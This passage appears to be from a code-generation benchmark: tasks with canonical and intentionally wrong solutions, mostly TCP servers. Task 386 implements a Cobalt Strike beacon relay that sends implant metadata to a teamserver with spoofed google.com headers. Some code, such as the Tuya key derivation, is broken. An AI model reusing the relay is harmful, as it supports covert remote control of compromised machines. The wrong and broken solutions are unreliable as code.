self.sockets:\n                self.sockets.remove(self.sockets[client_id])\n            if client_id in self.last_heartbeat:\n                del self.last_heartbeat[client_id]\n            if client_id in self.heartbeats:\n                del self.heartbeats[client_id]\n\n    def process_message(self, data, client_id):\n        if len(data) < 4:\n            return\n\n        msg_type = data[0]\n        msg_len = struct.unpack('>I', data[1:5])[0]\n        if len(data) < 4 + msg_len:\n            return\n\n        payload = data[5:5 + msg_len]\n        hmac_data = data[5 + msg_len:]\n\n        if msg_type == 0x01:  # SESS_KEY_NEG_START\n            self.handle_sess_key_neg_start(payload, client_id)\n        elif msg_type == 0x02:  # SESS_KEY_NEG_FINISH\n            self.handle_sess_key_neg_finish(payload, client_id)\n        elif msg_type == 0x03:  # DP_QUERY_NEW\n            self.handle_dp_query_new(payload, client_id)\n        else:\n            self.send_error_response(client_id, \"Unknown message type\")\n\n    def handle_sess_key_neg_start(self, payload, client_id):\n        if client_id not in self.clients or self.clients[client_id]['state'] != 'new':\n            return\n\n        self.clients[client_id]['state'] = 'negotiating'\n        self.clients[client_id]['seq_num'] = 0\n        self.clients[client_id]['temp_key'] = os.urandom(16)\n\n        response = self.generate_sess_key_neg_finish_response(\n            payload, self.clients[client_id]['temp_key']\n        )\n        self.send_message(response, client_id)\n\n    def generate_sess_key_neg_finish_response(self, payload, temp_key):\n        # Generate HMAC-SHA256 of the payload\n        hmac_obj = hmac.new(real_key, payload, hashlib.sha256)\n        hmac_value = hmac_obj.digest()\n\n        # Generate AES key using temp_key and real_key\n        aes_key = self.aes_key_from_temp_key(temp_key, real_key)\n\n        # Construct response\n        response = b'\\x02'  # SESS_KEY_NEG_FINISH\n        response += struct.pack('>I', 16 + len(hmac_value))  # Message length\n        response += temp_key\n        response += hmac_value\n        response += aes_key\n\n        return response\n\n    def aes_key_from_temp_key(self, temp_key, real_key):\n        # Simple key derivation for demonstration\n        return temp_key[:16] ^ real_key[:16]\n\n    def handle_sess_key_neg_finish(self, payload, client_id):\n        if client_id not in self.clients or self.clients[client_id]['state'] != 'negotiating':\n            return\n\n        client = self.clients[client_id]\n        client['state'] = 'established'\n        client['seq_num'] = 0\n        client['temp_key'] = os.urandom(16)\n        client['aes_key'] = self.aes_key_from_temp_key(client['temp_key'], real_key)\n\n        response = self.generate_dp_query_new_response(client)\n        self.send_message(response, client_id)\n\n    def generate_dp_query_new_response(self, client):\n        # Mock device state response\n        dp_state = b'\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n        response = b'\\x03'  # DP_QUERY_NEW\n        response += struct.pack('>I', 16 + len(dp_state))  # Message length\n        response += dp_state\n        return response\n\n    def handle_dp_query_new(self, payload, client_id):\n        if client_id not in self.clients or self.clients[client_id]['state'] != 'established':\n            return\n\n        client = self.clients[client_id]\n        client['seq_num'] += 1\n        client['last_msg_time'] = time.time()\n\n        response = self.generate_dp_query_new_response(client)\n        self.send_message(response, client_id)\n\n    def send_message(self, message, client_id):\n        if client_id in self.clients:\n            sock = self.clients[client_id]['sock']\n            sock.sendall(message)\n\n    def send_error_response(self, client_id, error_msg):\n        error = f\"Error: {error_msg}\".encode()\n        hmac_obj = hmac.new(real_key, error, hashlib.sha256)\n        hmac_value = hmac_obj.digest()\n        message = b'\\x00'  # Error response\n        message += struct.pack('>I', len(error) + len(hmac_value))\n        message += error\n        message += hmac_value\n        self.send_message(message, client_id)\n\n    def run(self):\n        server = self.create_socket()\n        server.bind((bind_host, bind_port))\n        server.listen(5)\n        print(f\"Tuya Server listening on {bind_host}:{bind_port}\")\n\n        while True:\n            try:\n                client_sock, client_addr = server.accept()\n                client_thread = threading.Thread(target=self.handle_client, args=(client_sock, client_addr))\n                client_thread.start()\n            except Exception as e:\n                print(f\"Server error: {e}\")\n\nif __name__ == \"__main__\":\n    server = TuyaServer()\n    server.run()"
  },
  {
    "Task_id": 386,
    "Instruction": "Task Description: Implement a TCP server that handles client connections, processes incoming data, and interacts with a teamserver through HTTP requests. The server should be able to read and write data based on client requests.\n\nFunction Description: The function `cc2_tcp_server` creates a TCP server that listens for client connections on a specified port. It processes incoming messages to either read data from or write data to a teamserver via HTTP requests. The server handles each client connection in a loop, processing the data and closing the connection afterward.\n\nInput: None (The function binds to a hardcoded IP address and port, and processes incoming client connections.)\n\nOutput: None (The function sends responses to clients but does not return any value.)\n\n---\n\nTask Description: Implement helper functions to support the TCP server's operations, including reading from and writing to a teamserver, parsing raw data, and extracting beacon data.\n\nFunction Description: The function `read_cs_teamserver` sends an HTTP GET request to a teamserver with metadata and extracts beacon data from the response. The function `write_cs_teamserver` sends an HTTP POST request to a teamserver with metadata. The function `parseRawData` splits raw data into a beacon ID and metadata. The function `find_beacon_data` extracts beacon data from a string based on prefix and suffix markers.\n\nInput:\n- `read_cs_teamserver`: `metadata` (str) - The metadata to include in the HTTP GET request.\n- `write_cs_teamserver`: `id` (str) - The beacon ID to include in the HTTP POST request URL; `metadata` (str) - The metadata to include in the HTTP POST request body.\n- `parseRawData`: `rawData` (str) - The raw data string to parse.\n- `find_beacon_data`: `prefix` (str) - The prefix marker for beacon data; `suffix` (str) - The suffix marker for beacon data; `data` (str) - The string to search for beacon data.\n\nOutput:\n- `read_cs_teamserver`: `beacon_data` (str) - The extracted beacon data from the HTTP response.\n- `write_cs_teamserver`: None (The function sends an HTTP POST request but does not return any value.)\n- `parseRawData`: `bid` (str) - The extracted beacon ID; `metadata` (str) - The extracted metadata.\n- `find_beacon_data`: `beacon_data` (str) - The extracted beacon data, or an empty string if not found.",
    "Canonical_solution": "import socket\nimport requests\n\ndef cc2_tcp_server():\n    sockobj = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    sockobj.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR, 1)\n    sockobj.bind(('127.0.0.1', 7777))\n    sockobj.listen(1000)\n\n    while True:\n        connection, address = sockobj.accept()\n        msgHeader = connection.recv(7)\n        if msgHeader == 'read|||':\n            data = connection.recv(10024)\n            metadata = read_cs_teamserver(data)\n            if len(metadata) > 0:\n                connection.send(metadata)\n        elif msgHeader == 'write||':\n            rawData = connection.recv(10024)\n            bid, metadata = parseRawData(rawData)\n            if len(metadata) > 0 and len(bid) > 0:\n                write_cs_teamserver(bid, metadata)\n        connection.close()\n\ndef read_cs_teamserver(metadata):\n    headers = { \"HOST\": \"www.google.com\",\n                \"Referer\": \"http://www.google.com/\",\n                \"Accept\": \"accccccc\",\n                \"User-Agent\": \"cc2_rebind_protocol_get_send\",\n                \"Cookie\": \"SESSION={}\".format(metadata),\n                \"Connection\": \"cc2_rebind_protocol_get_send\"\n    }\n    res = requests.get(\"http://127.0.0.1:443/aaaaaaaaa\", headers=headers)\n    start = \"ffffffff1\"\n    end = \"eeeeeeee2\"\n    beacon_data = find_beacon_data(start, end, res.content)\n    return beacon_data\n\ndef write_cs_teamserver(id, metadata):\n    headers = { \"HOST\": \"www.google.com\",\n                \"Referer\": \"http://www.google.com/\",\n                \"Accept\": \"accccccc\",\n                \"User-Agent\": \"cc2_rebind_protocol_post_send\",\n                \"Connection\": \"keep-alive\",\n                \"Content-Length\": \"{}\".format(len(metadata))\n    }\n    res = requests.post(\"http://127.0.0.1:443/bbbbbbbbb?SESSION={}\".format(id), headers=headers, data=metadata)\n\ndef parseRawData(rawData):\n    split = '->|<-'\n    split_index = rawData.find(split)\n    bid = rawData[:split_index]\n    metadata = rawData[len(split)+split_index:]\n    return bid,metadata\n\ndef find_beacon_data(prefix, suffix, data):\n    s_index = data.find(prefix) + 1\n    s_end = data.find(suffix)\n    beacon_data = ''\n    if (s_index > 0 and s_end > 0 and (s_index + len(prefix) + 1) != s_end:\n        beacon_data = data[s_index + len(prefix):s_end]\n    return beacon_data",
    "Code_level": "Function-level",
    "FSMID_for_test": 66,
    "wrong_result": "import socket\nimport requests\n\ndef cc2_tcp_server():\n    HOST = '127.0.0.1'\n    PORT = 12345\n\n    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server_socket:\n        server_socket.bind((HOST, PORT))\n        server_socket.listen(1)\n        print(f\"Server listening on {HOST}:{PORT}\")\n\n        while True:\n            client_socket, client_address = server_socket.accept()\n            print(f\"Connection from {client_address}\")\n            with client_socket:\n                data = client_socket.recv(1024)\n                if data:\n                    # Process incoming data\n                    bid, metadata = parseRawData(data.decode())\n                    beacon_data = read_cs_teamserver(metadata)\n                    \n                    # Send response to client\n                    client_socket.sendall(beacon_data.encode())\n\ndef read_cs_teamserver(metadata):\n    url = f\"https://teamserver.com/beacon?metadata={metadata}\"\n    response = requests.get(url)\n    return find_beacon_data(\"BEACON_START\", \"BEACON_END\", response.text)\n\ndef write_cs_teamserver(id, metadata):\n    url = f\"https://teamserver.com/beacon/{id}\"\n    headers = {'Content-Type': 'application/json'}\n    payload = {'metadata': metadata}\n    requests.post(url, headers=headers, json=payload)\n\ndef parseRawData(rawData):\n    bid, metadata = rawData.split(':', 1)\n    return bid, metadata\n\ndef find_beacon_data(prefix, suffix, data):\n    start_index = data.find(prefix)\n    end_index = data.rfind(suffix)\n    \n    if start_index != -1 and end_index != -1 and start_index < end_index:\n        return data[start_index + len(prefix):end_index]\n    return \"\""
  },
  {
    "Task_id": 39,
    "Instruction": "Task Description: Create a Python class that handles downloading files from a given URL and provides methods to retrieve the file name and read the file content.\n\nClass Description: The `UrlFile` class is designed to download files from a specified URL, manage temporary storage of the downloaded file, and provide methods to access the file name and content. It uses the `httpx` library for HTTP requests and handles temporary file storage with `tempfile`.\n\nAttributes:\n\n- url: str - The URL from which the file will be downloaded.\n- name: Optional[str] - An optional custom name for the downloaded file. If not provided, the name is derived from the URL.\n\nMethods:\n\n- get_filename() -> Optional[str] - Returns the filename derived from the URL or the custom name if provided.\n- read() -> Any - Downloads the file from the URL, saves it to a temporary directory, and returns a file-like object for reading the content. Raises an exception if the download fails or if the filename cannot be determined.",
    "Canonical_solution": "import httpx\nfrom pathlib import Path\nfrom typing import Any, Optional\nfrom tempfile import TemporaryDirectory\n\nclass UrlFile:\n    def __init__(self, url: str, name: Optional[str] = None):\n        self.url = url\n        self.name = name\n\n    def get_filename(self) -> Optional[str]:\n        return self.name or self.url.split(\"/\")[-1]\n\n    def read(self) -> Any:\n        logger.debug(f\"Downloading url: {self.url}\")\n        with httpx.Client() as client:\n            response = client.get(self.url)\n            response.raise_for_status()\n\n            with TemporaryDirectory() as temp_dir:\n                file_name = self.get_filename()\n                if file_name is None:\n                    raise ValueError(\"Could not determine a file name, please set `name`\")\n\n                file_path = Path(temp_dir).joinpath(file_name)\n                file_path.write_bytes(response.content)\n                logger.debug(f\"File downloaded and saved to {file_path.name}\")\n                return file_path.open(\"rb\")",
    "Code_level": "Class-level",
    "FSMID_for_test": 58,
    "wrong_result": "import httpx\nimport tempfile\nimport os\nfrom typing import Optional, Any\n\nclass UrlFile:\n    def __init__(self, url: str, name: Optional[str] = None):\n        self.url = url\n        self.name = name or os.path.basename(url)\n        self.temp_file_path = None\n\n    def get_filename(self) -> Optional[str]:\n        return self.name\n\n    def read(self) -> Any:\n        try:\n            response = httpx.get(self.url, timeout=10)\n            response.raise_for_status()\n        except Exception as e:\n            raise RuntimeError(f\"Failed to download file from URL: {e}\")\n\n        try:\n            with tempfile.NamedTemporaryFile(delete=False) as temp_file:\n                temp_file_path = temp_file.name\n                with open(temp_file_path, 'wb') as f:\n                    f.write(response.content)\n                self.temp_file_path = temp_file_path\n        except Exception as e:\n            raise RuntimeError(f\"Failed to save temporary file: {e}\")\n\n        try:\n            with open(self.temp_file_path, 'rb') as f:\n                return f\n        except Exception as e:\n            raise RuntimeError(f\"Failed to read file: {e}\")"
  },
  {
    "Task_id": 393,
    "Instruction": "Task Description: Implement a TCP server in Python that listens for incoming client connections, processes received commands, and sends responses back to the client. The server should handle multiple commands and arguments, and provide appropriate acknowledgments or negative acknowledgments based on command execution.\n\nFunction Description: The function `do_tcp_server` establishes a TCP server that listens on a specified port, accepts client connections, receives and processes commands, and sends responses. It uses a handler function to process commands and arguments, and manages the connection lifecycle.\n\nInput:\n- `client`: [Object] - A client object that provides a printer method for sending data.\n- `arguments`: [Dictionary] - A dictionary containing server configuration, including the port number under the key \"--tcpport\".\n- `handler`: [Function] - A callback function that processes commands and arguments. It takes two parameters: the command string and the parsed arguments, and returns a boolean indicating success (True for <ACK>, False for <NAK>).\n\nOutput:\n- None. The function runs indefinitely, handling client connections and commands until manually stopped. Responses are sent back to the client via the TCP connection.",
    "Canonical_solution": "import socket\n\ndef do_tcp_server(client, arguments, handler):\n    def tcpprint(arg):\n        if isinstance(arg, bytes) or isinstance(arg, bytearray):\n            return connection.sendall(arg)\n        else:\n            return connection.sendall(bytes(str(arg), 'utf-8'))\n\n    client.printer = tcpprint\n    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    port = int(arguments[\"--tcpport\"])\n    server_address = ('localhost', port)\n    print('starting up on %s port %s' % server_address)\n    sock.bind(server_address)\n    sock.listen(1)\n    response = None\n    while True:\n        print('waiting for a connection')\n        connection, client_address = sock.accept()\n        try:\n            print('connection from', client_address)\n            while True:\n                data = connection.recv(4096).decode('utf-8')\n                if data == '':\n                    break\n                print('received %s' % data)\n                if data:\n                    print('handling request')\n                    lines = data.split(\"\\n\")\n                    for line in lines:\n                        if \":\" in line:\n                            cmd = line.split(\":\")[0]\n                            marguments = line.split(\":\")[1]\n                            try:\n                                opts = parse_args(cmd, marguments, arguments)\n                            except:\n                                response = \"Wrong arguments\\n<NAK>\\n\"\n                                opts = None\n                            if opts is not None:\n                                if handler(cmd, opts):\n                                    response = \"<ACK>\\n\"\n                                else:\n                                    response = \"<NAK>\\n\"\n                            connection.sendall(bytes(response, 'utf-8'))\n        finally:\n            connection.close()",
    "Code_level": "Function-level",
    "FSMID_for_test": 66,
    "wrong_result": "def do_tcp_server(client, arguments, handler):\n    import socket\n    port = arguments[\"--tcpport\"]\n    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server_socket:\n        server_socket.bind(('localhost', port))\n        server_socket.listen(5)\n        print(f\"Server listening on port {port}\")\n        while True:\n            client_socket, addr = server_socket.accept()\n            print(f\"Connection from {addr}\")\n            with client_socket:\n                while True:\n                    data = client_socket.recv(1024).decode()\n                    if not data:\n                        break\n                    command, *args = data.split(\" \", 1)\n                    args = args[0].split() if args else []\n                    result = handler(command, args)\n                    response = \"<ACK>\" if result else \"<NAK>\"\n                    client.print(response)"
  },
  {
    "Task_id": 395,
    "Instruction": "Task Description: Create a TCP socket server implementation in Python that can handle multiple client connections asynchronously, with support for basic socket operations like accepting connections, sending/receiving data, and reading lines.\n\nClass Description: The implementation consists of two main classes: Listener (for server sockets) and Connection (for client connections), along with supporting event classes for asynchronous operations.\n\nAttributes:\n\nListener:\n- _closed: bool - Flag indicating if the socket is closed\n- host: str - The host address the server is bound to\n- port: int - The port number the server is listening on\n- sock: socket.socket - The underlying TCP socket object\n\nConnection:\n- sock: socket.socket - The connected socket object\n- addr: tuple - The client address (host, port)\n- _buf: bytes - Internal buffer for storing received data\n- _closed: bool - Flag indicating if the connection is closed\n\nMethods:\n\nListener:\n- __init__(host: str, port: int) -> None - Creates and binds a TCP socket to the specified host and port\n- accept() -> AcceptEvent - Returns an event that waits for and accepts incoming connections\n- close() -> None - Immediately closes the listening socket\n\nConnection:\n- __init__(sock: socket.socket, addr: tuple) -> None - Initializes a new connection with given socket and address\n- close() -> None - Closes the connection\n- recv(size: int) -> ReceiveEvent - Returns an event that receives up to size bytes of data\n- send(data: bytes) -> SendEvent - Returns an event that sends data (returns bytes sent)\n- sendall(data: bytes) -> SendEvent - Returns an event that sends all data\n- readline(terminator: bytes = b\"\\n\", bufsize: int = 1024) -> Generator[ReturnEvent, None, None] - Returns a generator that yields events to read a line\n\nSupporting Event Classes:\n- AcceptEvent(listener: Listener) - Event for accepting connections\n- ReceiveEvent(conn: Connection, bufsize: int) - Event for receiving data\n- SendEvent(conn: Connection, data: bytes, sendall: bool = False) - Event for sending data\n- WaitableEvent - Base class for all waitable events\n- ReturnEvent(value: Any) - Event for returning a value",
    "Canonical_solution": "import socket\nimport select\nimport time\nimport types\nimport collections\nimport errno\nimport sys\nimport traceback\n\nclass Listener:\n    \"\"\"A socket wrapper object for listening sockets.\"\"\"\n\n    def __init__(self, host, port):\n        \"\"\"Create a listening socket on the given hostname and port.\"\"\"\n        self._closed = False\n        self.host = host\n        self.port = port\n        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n        self.sock.bind((host, port))\n        self.sock.listen(5)\n\n    def accept(self):\n        \"\"\"An event that waits for a connection on the listening socket.\n        When a connection is made, the event returns a Connection\n        object.\n        \"\"\"\n        if self._closed:\n            raise SocketClosedError()\n        return AcceptEvent(self)\n\n    def close(self):\n        \"\"\"Immediately close the listening socket. (Not an event.)\"\"\"\n        self._closed = True\n        self.sock.close()\n\nclass Connection:\n    \"\"\"A socket wrapper object for connected sockets.\"\"\"\n\n    def __init__(self, sock, addr):\n        self.sock = sock\n        self.addr = addr\n        self._buf = b\"\"\n        self._closed = False\n\n    def close(self):\n        \"\"\"Close the connection.\"\"\"\n        self._closed = True\n        self.sock.close()\n\n    def recv(self, size):\n        \"\"\"Read at most size bytes of data from the socket.\"\"\"\n        if self._closed:\n            raise SocketClosedError()\n\n        if self._buf:\n            out = self._buf[:size]\n            self._buf = self._buf[size:]\n            return ValueEvent(out)\n        else:\n            return ReceiveEvent(self, size)\n\n    def send(self, data):\n        \"\"\"Sends data on the socket, returning the number of bytes\n        successfully sent.\n        \"\"\"\n        if self._closed:\n            raise SocketClosedError()\n        return SendEvent(self, data)\n\n    def sendall(self, data):\n        \"\"\"Send all of data on the socket.\"\"\"\n        if self._closed:\n            raise SocketClosedError()\n        return SendEvent(self, data, True)\n\n    def readline(self, terminator=b\"\\n\", bufsize=1024):\n        \"\"\"Reads a line (delimited by terminator) from the socket.\"\"\"\n        if self._closed:\n            raise SocketClosedError()\n\n        while True:\n            if terminator in self._buf:\n                line, self._buf = self._buf.split(terminator, 1)\n                line += terminator\n                yield ReturnEvent(line)\n                break\n            data = yield ReceiveEvent(self, bufsize)\n            if data:\n                self._buf += data\n            else:\n                line = self._buf\n                self._buf = b\"\"\n                yield ReturnEvent(line)\n                break\n\nclass AcceptEvent(WaitableEvent):\n    \"\"\"An event for Listener objects (listening sockets) that suspends\n    execution until the socket gets a connection.\n    \"\"\"\n\n    def __init__(self, listener):\n        self.listener = listener\n\n    def waitables(self):\n        return (self.listener.sock,), (), ()\n\n    def fire(self):\n        sock, addr = self.listener.sock.accept()\n        return Connection(sock, addr)\n\nclass ReceiveEvent(WaitableEvent):\n    \"\"\"An event for Connection objects (connected sockets) for\n    asynchronously reading data.\n    \"\"\"\n\n    def __init__(self, conn, bufsize):\n        self.conn = conn\n        self.bufsize = bufsize\n\n    def waitables(self):\n        return (self.conn.sock,), (), ()\n\n    def fire(self):\n        return self.conn.sock.recv(self.bufsize)\n\nclass SendEvent(WaitableEvent):\n    \"\"\"An event for Connection objects (connected sockets) for\n    asynchronously writing data.\n    \"\"\"\n\n    def __init__(self, conn, data, sendall=False):\n        self.conn = conn\n        self.data = data\n        self.sendall = sendall\n\n    def waitables(self):\n        return (), (self.conn.sock,), ()\n\n    def fire(self):\n        if self.sendall:\n            return self.conn.sock.sendall(self.data)\n        else:\n            return self.conn.sock.send(self.data)",
    "Code_level": "Class-level",
    "FSMID_for_test": 66,
    "wrong_result": "class Listener:\n    def __init__(self, host: str, port: int) -> None:\n        self._closed = False\n        self.host = host\n        self.port = port\n        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n        self.sock.bind((host, port))\n        self.sock.listen(5)\n\n    def accept(self) -> AcceptEvent:\n        return AcceptEvent(self)\n\n    def close(self) -> None:\n        self._closed = True\n        self.sock.close()\n\n\nclass Connection:\n    def __init__(self, sock: socket.socket, addr: tuple) -> None:\n        self.sock = sock\n        self.addr = addr\n        self._buf = b\"\"\n        self._closed = False\n\n    def close(self) -> None:\n        self._closed = True\n        self.sock.close()\n\n    def recv(self, size: int) -> ReceiveEvent:\n        return ReceiveEvent(self, size)\n\n    def send(self, data: bytes) -> SendEvent:\n        return SendEvent(self, data, sendall=False)\n\n    def sendall(self, data: bytes) -> SendEvent:\n        return SendEvent(self, data, sendall=True)\n\n\nclass AcceptEvent(WaitableEvent):\n    def __init__(self, listener: Listener) -> None:\n        super().__init__()\n        self.listener = listener\n\n\nclass ReceiveEvent(WaitableEvent):\n    def __init__(self, conn: Connection, bufsize: int) -> None:\n        super().__init__()\n        self.conn = conn\n        self.bufsize = bufsize\n\n\nclass SendEvent(WaitableEvent):\n    def __init__(self, conn: Connection, data: bytes, sendall: bool = False) -> None:\n        super().__init__()\n        self.conn = conn\n        self.data = data\n        self.sendall = sendall\n\n\nclass WaitableEvent:\n    def __init__(self) -> None:\n        self._value = None\n        self._done = False\n        self._result = None\n\n    def wait(self, timeout=None) -> bool:\n        if self._done:\n            return True\n        return super().wait(timeout)\n\n    def set_result(self, value) -> None:\n        self._result = value\n        self._done = True\n        super().set_result(value)\n\n\nclass ReturnEvent(WaitableEvent):\n    def __init__(self, value: Any) -> None:\n        super().__init__()\n        self.value = value\n\n    def set_result(self, value) -> None:\n        self.value = value\n        self._done = True\n        super().set_result(value)"
  },
  {
    "Task_id": 403,
    "Instruction": "Task Description: Create a TCP server that listens for incoming client connections, receives data from connected clients, and handles the connection in a separate thread to allow for concurrent operations.\n\nFunction Description: The code consists of two main functions: `start_server()` initializes and sets up the TCP server socket, while `start_server_thread()` handles the client connection in a separate thread, receiving data and managing the connection lifecycle.\n\nInput: \n- `start_server()`: No input parameters.\n- `start_server_thread()`: No input parameters.\n\nOutput: \n- `start_server()`: No return value, but it initializes the global `bad_socket` object.\n- `start_server_thread()`: No return value, but it prints connection details and handles data reception until the `stop` flag is set to `True`.\n\n---\n\nClass Description: This task can also be implemented as a class to encapsulate the TCP server functionality, making it more reusable and manageable.\n\nAttributes:\n- `bad_socket`: [socket.socket] - The TCP server socket object.\n- `stop`: [bool] - A flag to control the server thread's execution.\n\nMethods:\n- `start_server()` -> None - Initializes and sets up the TCP server socket.\n- `start_server_thread()` -> None - Handles client connections and data reception in a separate thread.\n- `stop_server()` -> None - Sets the `stop` flag to `True` to terminate the server thread gracefully.",
    "Canonical_solution": "import socket\nimport threading\nimport time\n\nbad_socket = None\nstop = False\n\ndef start_server():\n    global bad_socket\n    bad_socket = socket.socket(socket.AF_INET6, socket.SOCK_STREAM)\n    bad_socket.settimeout(0.5)  # timeout of 500ms\n    bad_socket.bind((\"\", 0))\n    bad_socket.listen(5)\n\ndef start_server_thread():\n    print(\"Before accept\")\n    (conn, addr) = bad_socket.accept()\n    print(\"Connected with {0}:{1}\".format(addr[0], addr[1]))\n    while True:\n        if stop:\n            break\n        try:\n            conn.recv(1024)\n            # sleep for 1 ms. This limits the rate to 1MBytes/sec or less\n            time.sleep(0.001)\n        except Exception as e:\n            print(e)\n    print(\"server thread stopped\")\n    bad_socket.close()",
    "Code_level": "Function-level",
    "FSMID_for_test": 66,
    "wrong_result": "import socket\nimport threading\n\nclass TcpServer:\n    def __init__(self):\n        self.bad_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        self.stop = False\n\n    def start_server(self):\n        self.bad_socket.bind(('localhost', 12345))\n        self.bad_socket.listen(5)\n        print(\"Server is listening on port 12345\")\n\n    def start_server_thread(self):\n        def client_handler(client_socket, client_address):\n            while not self.stop:\n                try:\n                    data = client_socket.recv(1024)\n                    if not data:\n                        break\n                    print(f\"Received from {client_address}: {data.decode()}\")\n                except Exception as e:\n                    print(f\"Error handling client {client_address}: {e}\")\n                    break\n            print(f\"Closing connection with {client_address}\")\n            client_socket.close()\n\n        thread = threading.Thread(target=client_handler, daemon=True)\n        thread.start()\n\n    def stop_server(self):\n        self.stop = True"
  },
  {
    "Task_id": 408,
    "Instruction": "Task Description: Implement a parameter server that handles client requests for model parameters, replay submissions, and draining operations using a threaded TCP server.\n\nClass Description: ParameterServer is a TCP-based server that manages model parameters and replay buffers for distributed training. It handles concurrent client connections and provides thread-safe operations for parameter exchange and replay buffer management.\n\nAttributes:\n\nstate: [State] - Dataclass containing server state including buffer directories, capacity, locks, and parameter versions\nbuffer_dir: [str] - Directory path for storing incoming replay buffers\ndrain_dir: [str] - Directory path for draining replay buffers to trainers\ncapacity: [int] - Maximum capacity of the replay buffer\nforce_sequential: [bool] - Flag to enforce sequential parameter updates\ndir_lock: [Lock] - Thread lock for directory operations\nparam_lock: [Lock] - Thread lock for parameter operations\nbuffer_size: [int] - Current size of the replay buffer\nsubmission_id: [int] - Counter for replay submissions\nmortal_param: [Optional[OrderedDict]] - Current mortal model parameters\ndqn_param: [Optional[OrderedDict]] - Current DQN model parameters\nparam_version: [int] - Version counter for parameter updates\nidle_param_version: [int] - Version marker for idle trainers\n\nMethods:\n\n__init__: [Name](buffer_dir: str, drain_dir: str, capacity: int, force_sequential: bool) -> [None] - Initializes the parameter server with buffer directories, capacity, and sequential flag\nstart_server: [Name](host: str, port: int) -> [None] - Starts the threaded TCP server on specified host and port\nhandle_get_param: [Name](msg: dict) -> [None] - Handles parameter retrieval requests from clients\nhandle_submit_replay: [Name](msg: dict) -> [None] - Handles replay buffer submissions from clients\nhandle_submit_param: [Name](msg: dict) -> [None] - Handles parameter updates from trainers\nhandle_drain: [Name]() -> [None] - Handles draining operations for transferring replay buffers to trainers",
    "Canonical_solution": "from socketserver import ThreadingTCPServer, BaseRequestHandler\nfrom threading import Lock\nfrom typing import Optional\nfrom collections import OrderedDict\nfrom dataclasses import dataclass\nimport os\nimport shutil\nimport logging\nimport torch\nfrom io import BytesIO\nfrom common import send_msg, recv_msg\n\n@dataclass\nclass State:\n    buffer_dir: str\n    drain_dir: str\n    capacity: int\n    force_sequential: bool\n    dir_lock: Lock\n    param_lock: Lock\n    buffer_size: int\n    submission_id: int\n    mortal_param: Optional[OrderedDict]\n    dqn_param: Optional[OrderedDict]\n    param_version: int\n    idle_param_version: int\n\nclass ParameterServer:\n    def __init__(self, buffer_dir: str, drain_dir: str, capacity: int, force_sequential: bool):\n        self.state = State(\n            buffer_dir=os.path.abspath(buffer_dir),\n            drain_dir=os.path.abspath(drain_dir),\n            capacity=capacity,\n            force_sequential=force_sequential,\n            dir_lock=Lock(),\n            param_lock=Lock(),\n            buffer_size=0,\n            submission_id=0,\n            mortal_param=None,\n            dqn_param=None,\n            param_version=0,\n            idle_param_version=0,\n        )\n\n    def start_server(self, host: str, port: int):\n        if os.path.isdir(self.state.buffer_dir):\n            shutil.rmtree(self.state.buffer_dir)\n        if os.path.isdir(self.state.drain_dir):\n            shutil.rmtree(self.state.drain_dir)\n        os.makedirs(self.state.buffer_dir)\n        os.makedirs(self.state.drain_dir)\n\n        class Handler(BaseRequestHandler):\n            def handle(self):\n                msg = recv_msg(self.request)\n                match msg['type']:\n                    case 'get_param':\n                        self.handle_get_param(msg)\n                    case 'submit_replay':\n                        self.handle_submit_replay(msg)\n                    case 'submit_param':\n                        self.handle_submit_param(msg)\n                    case 'drain':\n                        self.handle_drain()\n\n            def handle_get_param(self, msg):\n                with self.state.dir_lock:\n                    overflow = self.state.buffer_size >= self.state.capacity\n                    with self.state.param_lock:\n                        has_param = self.state.mortal_param is not None and self.state.dqn_param is not None\n                if overflow:\n                    send_msg(self.request, {'status': 'samples overflow'})\n                    return\n                if not has_param:\n                    send_msg(self.request, {'status': 'empty param'})\n                    return\n\n                client_param_version = msg['param_version']\n                buf = BytesIO()\n                with self.state.param_lock:\n                    if self.state.force_sequential and self.state.idle_param_version <= client_param_version:\n                        res = {'status': 'trainer is busy'}\n                    else:\n                        res = {\n                            'status': 'ok',\n                            'mortal': self.state.mortal_param,\n                            'dqn': self.state.dqn_param,\n                            'param_version': self.state.param_version,\n                        }\n                    torch.save(res, buf)\n                send_msg(self.request, buf.getbuffer(), packed=True)\n\n            def handle_submit_replay(self, msg):\n                with self.state.dir_lock:\n                    for filename, content in msg['logs'].items():\n                        filepath = os.path.join(self.state.buffer_dir, f'{self.state.submission_id}_{filename}')\n                        with open(filepath, 'wb') as f:\n                            f.write(content)\n                    self.state.buffer_size += len(msg['logs'])\n                    self.state.submission_id += 1\n                    logging.info(f'total buffer size: {self.state.buffer_size}')\n\n            def handle_submit_param(self, msg):\n                with self.state.param_lock:\n                    self.state.mortal_param = msg['mortal']\n                    self.state.dqn_param = msg['dqn']\n                    self.state.param_version += 1\n                    if msg['is_idle']:\n                        self.state.idle_param_version = self.state.param_version\n\n            def handle_drain(self):\n                drained_size = 0\n                with self.state.dir_lock:\n                    buffer_list = os.listdir(self.state.buffer_dir)\n                    raw_count = len(buffer_list)\n                    assert raw_count == self.state.buffer_size\n                    if (not self.state.force_sequential or raw_count >= self.state.capacity) and raw_count > 0:\n                        old_drain_list = os.listdir(self.state.drain_dir)\n                        for filename in old_drain_list:\n                            filepath = os.path.join(self.state.drain_dir, filename)\n                            os.remove(filepath)\n                        for filename in buffer_list:\n                            src = os.path.join(self.state.buffer_dir, filename)\n                            dst = os.path.join(self.state.drain_dir, filename)\n                            shutil.move(src, dst)\n                        drained_size = raw_count\n                        self.state.buffer_size = 0\n                        logging.info(f'files transferred to trainer: {drained_size}')\n                        logging.info(f'total buffer size: {self.state.buffer_size}')\n                send_msg(self.request, {\n                    'count': drained_size,\n                    'drain_dir': self.state.drain_dir,\n                })\n\n        server = ThreadingTCPServer((host, port), Handler)\n        server.allow_reuse_address = True\n        server.daemon_threads = True\n 